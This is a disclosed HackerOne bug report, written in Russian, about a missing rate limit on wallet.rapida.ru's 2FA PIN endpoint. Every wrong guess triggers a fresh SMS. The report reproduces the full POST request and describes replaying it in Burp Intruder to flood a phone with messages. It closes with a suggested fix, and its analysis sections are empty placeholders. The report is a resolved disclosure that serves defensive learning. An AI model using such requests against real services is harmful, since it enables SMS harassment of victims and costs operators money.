---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '209368'
original_report_id: '209368'
title: '[wallet.rapida.ru] Mass SMS flood'
weakness: Improper Restriction of Authentication Attempts
team_handle: qiwi
created_at: '2017-02-27T17:48:36.124Z'
disclosed_at: '2018-05-18T15:58:20.043Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- improper-restriction-of-authentication-attempts
---

# [wallet.rapida.ru] Mass SMS flood

## Metadata

- HackerOne Report ID: 209368
- Weakness: Improper Restriction of Authentication Attempts
- Program: qiwi
- Disclosed At: 2018-05-18T15:58:20.043Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

... или сказ о том, как я опрометчиво заказал себе рассылку из 300 смс.

#Шаги для воспроизведения:

1) Логинимся в wallet.rapida.ru

2) Идём в шаблоны и создаём себе шаблон для оплаты мобилы

3) Если вы до этого нигде не вводили 2FA код - то сейчас самая фишка - нас просят его ввести.

4) Ловим запрос и посылаем в интрудер:

```
POST /shops/service_pin/ HTTP/1.1
Host: wallet.rapida.ru
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://wallet.rapida.ru/shops/service/
Cookie: <MANY_COOKIES>
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 97

csrfmiddlewaretoken=OeAE6H3RRanCyG5HdSJWiiST5iyvC0rz&7=<MOBILE>&amount=200.00&spin=<INTRUDER_VALUE>&stid=9
```

5) Заряжаем перебирать spin от сих и до сих. Смотря насколько вы себя не любите, в общем.

6) На каждый такой запрос вам ругнутся, что код не правильный и сразу пошлют новый.

1 попытка интрудера = 1 новый код.

Я поймал 112 смс и поставил тел на беззвучный, так как до сих пор идут.

#Fix:

3 попытки ввести код и прекращать функцию регистрации шаблона. Оно того не стоит)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
